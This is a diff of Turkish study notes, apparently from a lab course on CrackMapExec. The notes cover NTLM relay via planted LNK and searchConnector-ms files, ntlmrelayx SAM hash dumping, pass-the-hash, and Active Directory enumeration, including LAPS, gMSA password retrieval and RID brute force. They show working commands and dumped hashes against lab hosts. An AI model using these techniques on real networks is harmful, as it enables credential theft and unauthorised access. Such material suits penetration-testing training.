-Şimdi Proxychains'i kullanabilir ve SMB İmzalama devre dışı bırakılmış makinelerin bir listesini alabiliriz
+Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
 
+Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
 
 ### Getting Relay List
 
-![Pasted image 20241202172448.png](/img/user/resimler/Pasted%20image%2020241202172448.png)
-![Pasted image 20241202172452.png](/img/user/resimler/Pasted%20image%2020241202172452.png)
+```
+proxychains4 -q crackmapexec smb 172.16.1.0/24 --gen-relay-list relay.txt
 
-ntlmrelayx'i --gen-relay-list seçeneğinden elde ettiğimiz önceki liste ile kullanacağız. Hedef makinede yerel yönetici ayrıcalıklarına sahip bir hesap bulursak, başka bir seçenek belirtilmemişse, ntlmrelayx otomatik olarak hedef makinenin SAM veritabanını dökecek ve herhangi bir lokal yönetici kullanıcı hash'iyle bir pass-the-hash saldırısı gerçekleştirmeyi deneyebileceğiz
+SMB 172.16.1.5 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
+(SMBv1:False)
+SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+
+cat relay.txt
+172.16.1.5
+```
 
 
+**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
+
+Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
 
 ### Execute NTLMRelayX
-![Pasted image 20241202172848.png](/img/user/resimler/Pasted%20image%2020241202172848.png)
 
-Bir kullanıcı SMB paylaşımına erişene ve LNK dosyamız onu hedef makinemize bağlanmaya zorlayana kadar beklememiz gerekir (bu arka planda gerçekleşir ve kullanıcı olağan dışı bir şey fark etmeyecektir). Bu yapıldıktan sonra, ntlmrelayx konsolunda buna benzer bir şey görmeliyiz:
+```
+sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
 
-![Pasted image 20241202172943.png](/img/user/resimler/Pasted%20image%2020241202172943.png)
-![Pasted image 20241202172950.png](/img/user/resimler/Pasted%20image%2020241202172950.png)
+Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
+Corporation
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Running in relay mode to hosts in targetfile
+[*] Setting up SMB Server
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+[*] Servers started, waiting for connections
+```
 
-Ardından, yönetici hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
+Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
 
+Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
+
+```
+sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
+
+Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
+Corporation
+<SNIP>
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
+controlled, attacking target smb://172.16.1.5
+[*] Authenticating against smb://172.16.1.5 as INLANEFREIGHT/JULIO SUCCEED
+[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
+controlled, but there are no more targets left!
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x29fc3535fc09fb37d22dc9f3339f6875
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0
+660cf3453:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
+0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
+d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077a
+ee1958e7f78070:::
+localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236
+ed3f3ac:::
+sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f
+6:::
+htb:1006:aad3b435b51404eeaad3b435b51404ee:6593d8c034bbe9db50e4ce94b1943701
+:::
+[*] Done dumping SAM hashes for host: 172.16.1.5
+[*] Stopping service RemoteRegistry
+```
+
+Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
 
 ### Local Hesapları Test Etme
 
-![Pasted image 20241202173025.png](/img/user/resimler/Pasted%20image%2020241202173025.png)
+```
+proxychains4 -q crackmapexec smb 172.16.1.5 -u administrator -H
+30b3783ce2abf1af70f77d0660cf3453 --local-auth
 
+SMB 172.16.1.5 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
+SMB 172.16.1.5 445 MS01 [+]
+MS01\administrator:30b3783ce2abf1af70f77d0660cf3453 (Pwn3d!)
+```
 
 ### Her Şeyi Temizleyin
-Modül ile işimiz bittiğinde, -o CLEANUP=YES seçeneğini kullanarak LNK dosyasını temizlemek ve LNK dosyasının adını NAME=important olarak belirlemek çok önemlidir.
 
+Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
 
 ### Cleanup
-![Pasted image 20241202173114.png](/img/user/resimler/Pasted%20image%2020241202173114.png)
 
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
+-M slinky -o NAME=important CLEANUP=YES
+
+[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
+SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 172.16.1.10 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SLINKY 172.16.1.10 445 DC01 [+] Found writable
+share: HR
+SLINKY 172.16.1.10 445 DC01 [+] Deleted LNK file
+on the HR share
+SLINKY 172.16.1.10 445 DC01 [+] Found writable
+share: IT-Tools
+SLINKY 172.16.1.10 445 DC01 [+] Deleted LNK file
+on the IT-Tools share
+```
+
+### drop-sc Modülü ile Hash'lerin Çalınması
+Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
+
+Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+
+CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+
+İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
+
+* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+
+* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+
+* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+
+Drop-sc'yi iş başında görelim:
+
+
+### Dropping a searchConnector-ms File
+
+![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+
+![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+
+Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+
+
+### NTLMRelayx ve drop-sc Kullanarak Aktarma
+
+![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
+![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
+
+Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+
+
+### searchConnector-ms Dosyalarını Temizleme
+![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
+![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
+
+LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+
+### SMB ile Eşleme ve Numaralandırma
+
+CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
+
+![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
+![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+
+Daha önce çalışmamış olanları gözden geçirelim:
+
+### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+
+Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+
+
+### Sessions ve loggendon-users seçeneklerini kullanma
+![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
+
+Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+
+
+### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
+![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
+![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+
+### Enumerate Computers
+
+CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
+
+
+### Domain'deki Bilgisayarları Numaralandırma
+![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
+
+
+### Enumerate LAPS
+
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+
+![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
+
+![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+
+![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
+
+Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
+
+
+### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
+
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+
+
+### List Local Users
+
+![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
+![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
+![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
+![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
+![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+
+Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+
+rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
+
+
+### Enumerate Disks
+
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+
+### Enumerating Disks
+![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+
+### Local ve Domain Gruplarını Numaralandırma
+Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+### Enumerating Local Groups
+![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
+![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
+
+
+### Enumerating Domain Groups
+![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
+![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
+
+Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+
+
+### Group **Members**
+![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
+
+Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+
+
+### Querying WMI
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+
+Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+
+WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+
+
+### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
+![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
+
+WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+
+
+### Quering root\WMI Namespace
+![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
+![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
+
+Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+
+Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
+
+
+### LDAP and RDP Enumeration
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
+
+
+### LDAP & RDP Commands
+LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
+![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
+![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
+
+Henüz çalışmadıklarımızı gözden geçirelim.
+
+
+### Enumerating Users and Groups
+
+SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+
+### Enumerating Users and Groups
+
+![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
+![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
+![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
+![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+
+
+### İlginç Hesap Özelliklerini Numaralandırma
+
+ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+
+PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
+
+
+### PASSWD_NOTREQD Özniteliğinin Tanımlanması
+
+![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
+![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
+
+TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Kısıtlamasız Delegasyonun Belirlenmesi
+![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
+
+adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+
+
+### adminCount Özniteliğini Sorgulama
+![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
+![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
+![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+
+
+### Domain SID'sini numaralandırma
+
+Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+
+
+### Gathering the Domain SID
+
+![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
+![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+
+
+### Group Managed Service Accounts (gMSA)
+
+Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:
+
+* Otomatik parola yönetimi.
+* Basitleştirilmiş service principal name (SPN) yönetimi.
+* Yönetimi diğer yöneticilere devretme yeteneği
+
+Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+
+Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
+
+Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
+
+
+### Enumerating Accounts with gMSA Privileges
+![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
+![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
+
+Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+
+
+### gMSA Parolasını Edinme
+![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
+
+
+### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
+![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
+![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
+
+
+### RDP Screenshots
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+
+### Enumerate Login Prompt
+![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
+
+Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
+
+
+
+### Taking a Screenshot
+![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
+![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+
+
+Not: --screentime ve --res isteğe bağlı bayraklardır.
+
+Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
+
+
+Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
+
+
+
+
+
+### Command Execution
+
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+
+![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+
+Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+
+Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+
+
+
+### Command Execution as Administrator
